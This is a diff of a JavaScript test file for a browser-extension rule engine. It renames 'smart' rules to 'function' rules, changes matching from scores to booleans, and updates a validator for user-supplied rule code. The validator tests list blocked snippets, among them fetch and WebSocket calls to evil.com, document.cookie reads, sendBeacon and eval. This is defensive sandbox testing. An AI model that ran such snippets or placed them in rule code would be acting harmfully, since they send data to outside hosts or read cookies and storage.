@@ -8,7 +8,7 @@ import {
   RULE_TYPES,
   generateRuleId,
   validateRuleConfig,
-  validateSmartRuleFn,
+  validateFnRuleSource,
   matchKeywordRule,
   matchRules,
   buildPageDataFromEntry,
@@ -26,7 +26,7 @@ describe('generateRuleId', () => {
 
   it('uses first char of type', () => {
     expect(generateRuleId('keyword', 1000)).toMatch(/^rule-k-/);
-    expect(generateRuleId('smart', 1000)).toMatch(/^rule-s-/);
+    expect(generateRuleId('function', 1000)).toMatch(/^rule-f-/);
   });
 
   it('encodes timestamp in base36', () => {
@@ -64,7 +64,7 @@ describe('validateRuleConfig', () => {
         config: { fields: ['title'] },
       });
       expect(result.valid).toBe(false);
-      expect(result.errors.some(e => e.includes('pattern'))).toBe(true);
+      expect(result.errors.some((e) => e.includes('pattern'))).toBe(true);
     });
 
     it('rejects empty pattern', () => {
@@ -81,7 +81,7 @@ describe('validateRuleConfig', () => {
         config: { pattern: 'test', fields: ['body'] },
       });
       expect(result.valid).toBe(false);
-      expect(result.errors.some(e => e.includes('fields'))).toBe(true);
+      expect(result.errors.some((e) => e.includes('fields'))).toBe(true);
     });
 
     it('defaults fields to title+url when not specified', () => {
@@ -106,17 +106,17 @@ describe('validateRuleConfig', () => {
         config: { pattern: '/[invalid(/', fields: ['title'] },
       });
       expect(result.valid).toBe(false);
-      expect(result.errors.some(e => e.includes('regex'))).toBe(true);
+      expect(result.errors.some((e) => e.includes('regex'))).toBe(true);
     });
   });
 
-  describe('smart rules', () => {
-    it('accepts valid smart config', () => {
+  describe('function rules', () => {
+    it('accepts valid function config', () => {
       const result = validateRuleConfig({
-        type: 'smart',
+        type: 'function',
         config: {
           description: 'pages with long titles',
-          fnSource: 'return page.title.length > 50 ? 1 : 0;',
+          fnSource: 'return page.title.length > 50;',
         },
       });
       expect(result.valid).toBe(true);
@@ -124,27 +124,27 @@ describe('validateRuleConfig', () => {
 
     it('rejects missing fnSource', () => {
       const result = validateRuleConfig({
-        type: 'smart',
+        type: 'function',
         config: { description: 'test' },
       });
       expect(result.valid).toBe(false);
-      expect(result.errors.some(e => e.includes('fnSource'))).toBe(true);
+      expect(result.errors.some((e) => e.includes('fnSource'))).toBe(true);
     });
 
     it('rejects missing description', () => {
       const result = validateRuleConfig({
-        type: 'smart',
+        type: 'function',
         config: { fnSource: 'return 1;' },
       });
       expect(result.valid).toBe(false);
-      expect(result.errors.some(e => e.includes('description'))).toBe(true);
+      expect(result.errors.some((e) => e.includes('description'))).toBe(true);
     });
   });
 
   it('rejects unknown rule type', () => {
     const result = validateRuleConfig({ type: 'unknown', config: {} });
     expect(result.valid).toBe(false);
-    expect(result.errors.some(e => e.includes('type'))).toBe(true);
+    expect(result.errors.some((e) => e.includes('type'))).toBe(true);
   });
 });
 
@@ -152,113 +152,131 @@ describe('validateRuleConfig', () => {
 // validateSmartRuleFn
 // ---------------------------------------------------------------------------
 
-describe('validateSmartRuleFn', () => {
+describe('validateFnRuleSource', () => {
   it('accepts clean function source', () => {
-    const result = validateSmartRuleFn('return page.title.length > 50 ? 1 : 0;');
+    const result = validateFnRuleSource(
+      'return page.title.length > 50 ? 1 : 0;',
+    );
     expect(result.valid).toBe(true);
     expect(result.errors).toHaveLength(0);
   });
 
   it('rejects fetch usage', () => {
-    const result = validateSmartRuleFn('return fetch("http://evil.com").then(() => 1);');
+    const result = validateFnRuleSource(
+      'return fetch("http://evil.com").then(() => 1);',
+    );
     expect(result.valid).toBe(false);
-    expect(result.errors.some(e => e.includes('fetch'))).toBe(true);
+    expect(result.errors.some((e) => e.includes('fetch'))).toBe(true);
   });
 
   it('rejects chrome API usage', () => {
-    const result = validateSmartRuleFn('chrome.storage.local.get("key"); return 1;');
+    const result = validateFnRuleSource(
+      'chrome.storage.local.get("key"); return 1;',
+    );
     expect(result.valid).toBe(false);
-    expect(result.errors.some(e => e.includes('chrome'))).toBe(true);
+    expect(result.errors.some((e) => e.includes('chrome'))).toBe(true);
   });
 
   it('rejects window usage', () => {
-    const result = validateSmartRuleFn('window.location.href; return 1;');
+    const result = validateFnRuleSource('window.location.href; return 1;');
     expect(result.valid).toBe(false);
   });
 
   it('rejects document usage', () => {
-    const result = validateSmartRuleFn('document.cookie; return 1;');
+    const result = validateFnRuleSource('document.cookie; return 1;');
     expect(result.valid).toBe(false);
   });
 
   it('rejects eval usage', () => {
-    const result = validateSmartRuleFn('eval("alert(1)"); return 1;');
+    const result = validateFnRuleSource('eval("alert(1)"); return 1;');
     expect(result.valid).toBe(false);
   });
 
   it('rejects Function constructor', () => {
-    const result = validateSmartRuleFn('new Function("return 1")(); return 1;');
+    const result = validateFnRuleSource(
+      'new Function("return 1")(); return 1;',
+    );
     expect(result.valid).toBe(false);
   });
 
   it('rejects globalThis', () => {
-    const result = validateSmartRuleFn('globalThis.fetch("x"); return 1;');
+    const result = validateFnRuleSource('globalThis.fetch("x"); return 1;');
     expect(result.valid).toBe(false);
   });
 
   it('rejects setTimeout', () => {
-    const result = validateSmartRuleFn('setTimeout(() => {}, 0); return 1;');
+    const result = validateFnRuleSource('setTimeout(() => {}, 0); return 1;');
     expect(result.valid).toBe(false);
   });
 
   it('rejects setInterval', () => {
-    const result = validateSmartRuleFn('setInterval(() => {}, 1000); return 1;');
+    const result = validateFnRuleSource(
+      'setInterval(() => {}, 1000); return 1;',
+    );
     expect(result.valid).toBe(false);
   });
 
   it('rejects WebSocket', () => {
-    const result = validateSmartRuleFn('new WebSocket("ws://evil.com"); return 1;');
+    const result = validateFnRuleSource(
+      'new WebSocket("ws://evil.com"); return 1;',
+    );
     expect(result.valid).toBe(false);
   });
 
   it('rejects Worker', () => {
-    const result = validateSmartRuleFn('new Worker("evil.js"); return 1;');
+    const result = validateFnRuleSource('new Worker("evil.js"); return 1;');
     expect(result.valid).toBe(false);
   });
 
   it('rejects localStorage', () => {
-    const result = validateSmartRuleFn('localStorage.getItem("x"); return 1;');
+    const result = validateFnRuleSource('localStorage.getItem("x"); return 1;');
     expect(result.valid).toBe(false);
   });
 
   it('rejects sessionStorage', () => {
-    const result = validateSmartRuleFn('sessionStorage.getItem("x"); return 1;');
+    const result = validateFnRuleSource(
+      'sessionStorage.getItem("x"); return 1;',
+    );
     expect(result.valid).toBe(false);
   });
 
   it('rejects indexedDB', () => {
-    const result = validateSmartRuleFn('indexedDB.open("x"); return 1;');
+    const result = validateFnRuleSource('indexedDB.open("x"); return 1;');
     expect(result.valid).toBe(false);
   });
 
   it('rejects importScripts', () => {
-    const result = validateSmartRuleFn('importScripts("evil.js"); return 1;');
+    const result = validateFnRuleSource('importScripts("evil.js"); return 1;');
     expect(result.valid).toBe(false);
   });
 
   it('rejects navigator', () => {
-    const result = validateSmartRuleFn('navigator.sendBeacon("/log", "data"); return 1;');
+    const result = validateFnRuleSource(
+      'navigator.sendBeacon("/log", "data"); return 1;',
+    );
     expect(result.valid).toBe(false);
   });
 
   it('rejects source >10KB', () => {
     const bigSource = 'return 1;' + ' '.repeat(11000);
-    const result = validateSmartRuleFn(bigSource);
+    const result = validateFnRuleSource(bigSource);
     expect(result.valid).toBe(false);
-    expect(result.errors.some(e => e.includes('10KB') || e.includes('10240'))).toBe(true);
+    expect(
+      result.errors.some((e) => e.includes('10KB') || e.includes('10240')),
+    ).toBe(true);
   });
 
   it('allows page property access', () => {
-    const result = validateSmartRuleFn(
-      'if (page.url.includes("github.com")) return 1; return 0;'
+    const result = validateFnRuleSource(
+      'if (page.url.includes("github.com")) return 1; return 0;',
     );
     expect(result.valid).toBe(true);
   });
 
   it('does not false-positive on substrings', () => {
     // "fetchResults" contains "fetch" as substring — should NOT trigger
-    const result = validateSmartRuleFn(
-      'const fetchResults = page.title.length; return fetchResults > 10 ? 1 : 0;'
+    const result = validateFnRuleSource(
+      'const fetchResults = page.title.length; return fetchResults > 10 ? 1 : 0;',
     );
     expect(result.valid).toBe(true);
   });
@@ -271,17 +289,26 @@ describe('validateSmartRuleFn', () => {
 describe('matchKeywordRule', () => {
   it('matches substring in title', () => {
     const rule = { config: { pattern: 'hello', fields: ['title'] } };
-    expect(matchKeywordRule(rule, { title: 'say hello world', url: 'https://x.com' })).toBe(1);
+    expect(
+      matchKeywordRule(rule, {
+        title: 'say hello world',
+        url: 'https://x.com',
+      }),
+    ).toBe(1);
   });
 
   it('matches substring in url', () => {
     const rule = { config: { pattern: 'github', fields: ['url'] } };
-    expect(matchKeywordRule(rule, { title: 'Repo', url: 'https://github.com/foo' })).toBe(1);
+    expect(
+      matchKeywordRule(rule, { title: 'Repo', url: 'https://github.com/foo' }),
+    ).toBe(1);
   });
 
   it('returns 0 on no match', () => {
     const rule = { config: { pattern: 'xyz', fields: ['title'] } };
-    expect(matchKeywordRule(rule, { title: 'hello world', url: 'https://x.com' })).toBe(0);
+    expect(
+      matchKeywordRule(rule, { title: 'hello world', url: 'https://x.com' }),
+    ).toBe(0);
   });
 
   it('matches case-insensitively by default', () => {
@@ -290,20 +317,28 @@ describe('matchKeywordRule', () => {
   });
 
   it('respects caseSensitive flag', () => {
-    const rule = { config: { pattern: 'HELLO', fields: ['title'], caseSensitive: true } };
+    const rule = {
+      config: { pattern: 'HELLO', fields: ['title'], caseSensitive: true },
+    };
     expect(matchKeywordRule(rule, { title: 'hello world', url: '' })).toBe(0);
     expect(matchKeywordRule(rule, { title: 'HELLO world', url: '' })).toBe(1);
   });
 
   it('checks both title and url when fields has both', () => {
     const rule = { config: { pattern: 'match', fields: ['title', 'url'] } };
-    expect(matchKeywordRule(rule, { title: 'no', url: 'https://match.com' })).toBe(1);
-    expect(matchKeywordRule(rule, { title: 'match here', url: 'https://x.com' })).toBe(1);
+    expect(
+      matchKeywordRule(rule, { title: 'no', url: 'https://match.com' }),
+    ).toBe(1);
+    expect(
+      matchKeywordRule(rule, { title: 'match here', url: 'https://x.com' }),
+    ).toBe(1);
   });
 
   it('defaults fields to title+url when not specified', () => {
     const rule = { config: { pattern: 'found' } };
-    expect(matchKeywordRule(rule, { title: 'not here', url: 'https://found.com' })).toBe(1);
+    expect(
+      matchKeywordRule(rule, { title: 'not here', url: 'https://found.com' }),
+    ).toBe(1);
   });
 
   it('handles regex pattern', () => {
@@ -335,61 +370,121 @@ describe('matchKeywordRule', () => {
 // ---------------------------------------------------------------------------
 
 describe('matchRules', () => {
-  it('matches keyword rules without embedder/sandbox', async () => {
+  it('matches keyword rules without sandbox', async () => {
     const rules = [
-      { id: 'r1', type: 'keyword', config: { pattern: 'github', fields: ['url'], threshold: 0.5 } },
+      {
+        id: 'r1',
+        type: 'keyword',
+        config: { pattern: 'github', fields: ['url'] },
+      },
     ];
     const pageData = { title: 'My Repo', url: 'https://github.com/foo' };
     const results = await matchRules(rules, pageData, {});
     expect(results).toHaveLength(1);
-    expect(results[0]).toEqual({ ruleId: 'r1', score: 1, match: true });
+    expect(results[0]).toEqual({ ruleId: 'r1', match: true });
   });
 
-  it('filters below threshold', async () => {
+  it('excludes non-matches by default', async () => {
     const rules = [
-      { id: 'r1', type: 'keyword', config: { pattern: 'notfound', fields: ['title'], threshold: 0.5 } },
+      {
+        id: 'r1',
+        type: 'keyword',
+        config: { pattern: 'notfound', fields: ['title'] },
+      },
     ];
     const results = await matchRules(rules, { title: 'hello', url: '' }, {});
     expect(results).toHaveLength(0);
   });
 
-  it('matches smart rules with mock sandbox', async () => {
-    const sandbox = vi.fn().mockResolvedValue(0.8);
+  it('matches function rules with mock sandbox returning true', async () => {
+    const sandbox = vi.fn().mockResolvedValue(true);
     const rules = [
-      { id: 'r1', type: 'smart', config: { fnSource: 'return 0.8;', threshold: 0.5 } },
+      {
+        id: 'r1',
+        type: 'function',
+        config: { fnSource: 'return true;' },
+      },
     ];
     const pageData = { title: 'test', url: 'https://x.com' };
     const results = await matchRules(rules, pageData, { sandbox });
     expect(results).toHaveLength(1);
-    expect(results[0]).toEqual({ ruleId: 'r1', score: 0.8, match: true });
-    expect(sandbox).toHaveBeenCalledWith('return 0.8;', pageData);
+    expect(results[0]).toEqual({ ruleId: 'r1', match: true });
+    expect(sandbox).toHaveBeenCalledWith('return true;', pageData);
+  });
+
+  it('excludes function rules returning false', async () => {
+    const sandbox = vi.fn().mockResolvedValue(false);
+    const rules = [
+      {
+        id: 'r1',
+        type: 'function',
+        config: { fnSource: 'return false;' },
+      },
+    ];
+    const results = await matchRules(
+      rules,
+      { title: 'test', url: 'https://x.com' },
+      { sandbox },
+    );
+    expect(results).toHaveLength(0);
   });
 
   it('handles mixed rule types', async () => {
-    const sandbox = vi.fn().mockResolvedValue(0.9);
+    const sandbox = vi.fn().mockResolvedValue(true);
     const rules = [
-      { id: 'r1', type: 'keyword', config: { pattern: 'test', fields: ['title'], threshold: 0.5 } },
-      { id: 'r2', type: 'smart', config: { fnSource: 'return 0.9;', threshold: 0.5 } },
+      {
+        id: 'r1',
+        type: 'keyword',
+        config: { pattern: 'test', fields: ['title'] },
+      },
+      {
+        id: 'r2',
+        type: 'function',
+        config: { fnSource: 'return true;' },
+      },
     ];
-    const results = await matchRules(rules, { title: 'test', url: 'https://x.com' }, { sandbox });
+    const results = await matchRules(
+      rules,
+      { title: 'test', url: 'https://x.com' },
+      { sandbox },
+    );
     expect(results).toHaveLength(2);
   });
 
-  it('skips smart rules when no sandbox provided', async () => {
+  it('skips function rules when no sandbox provided', async () => {
     const rules = [
-      { id: 'r1', type: 'smart', config: { fnSource: 'return 1;', threshold: 0.5 } },
+      {
+        id: 'r1',
+        type: 'function',
+        config: { fnSource: 'return true;' },
+      },
     ];
     const results = await matchRules(rules, { title: 'test', url: '' }, {});
     expect(results).toHaveLength(0);
   });
 
-  it('uses default threshold of 0.5 for keyword when not specified', async () => {
+  it('includes all rules when allResults is true', async () => {
+    const sandbox = vi.fn().mockResolvedValue(false);
     const rules = [
-      { id: 'r1', type: 'keyword', config: { pattern: 'test', fields: ['title'] } },
+      {
+        id: 'r1',
+        type: 'keyword',
+        config: { pattern: 'notfound', fields: ['title'] },
+      },
+      {
+        id: 'r2',
+        type: 'function',
+        config: { fnSource: 'return false;' },
+      },
     ];
-    // keyword match returns 1, default threshold 0.5 → passes
-    const results = await matchRules(rules, { title: 'test page', url: '' }, {});
-    expect(results).toHaveLength(1);
+    const results = await matchRules(
+      rules,
+      { title: 'test', url: '' },
+      { sandbox, allResults: true },
+    );
+    expect(results).toHaveLength(2);
+    expect(results[0]).toEqual({ ruleId: 'r1', match: false });
+    expect(results[1]).toEqual({ ruleId: 'r2', match: false });
   });
 });
 
@@ -399,13 +494,28 @@ describe('matchRules', () => {
 
 describe('buildPageDataFromEntry', () => {
   it('extracts title and url from visit_page entry', () => {
-    const entry = { timestamp: 100, action: 'visit_page', url: 'https://x.com', title: 'X' };
-    expect(buildPageDataFromEntry(entry)).toEqual({ title: 'X', url: 'https://x.com' });
+    const entry = {
+      timestamp: 100,
+      action: 'visit_page',
+      url: 'https://x.com',
+      title: 'X',
+    };
+    expect(buildPageDataFromEntry(entry)).toEqual({
+      title: 'X',
+      url: 'https://x.com',
+    });
   });
 
   it('handles missing title', () => {
-    const entry = { timestamp: 100, action: 'visit_page', url: 'https://x.com' };
-    expect(buildPageDataFromEntry(entry)).toEqual({ title: '', url: 'https://x.com' });
+    const entry = {
+      timestamp: 100,
+      action: 'visit_page',
+      url: 'https://x.com',
+    };
+    expect(buildPageDataFromEntry(entry)).toEqual({
+      title: '',
+      url: 'https://x.com',
+    });
   });
 
   it('handles missing url', () => {
@@ -421,6 +531,6 @@ describe('buildPageDataFromEntry', () => {
 describe('RULE_TYPES', () => {
   it('has expected values', () => {
     expect(RULE_TYPES.KEYWORD).toBe('keyword');
-    expect(RULE_TYPES.SMART).toBe('smart');
+    expect(RULE_TYPES.FUNCTION).toBe('function');
   });
 });
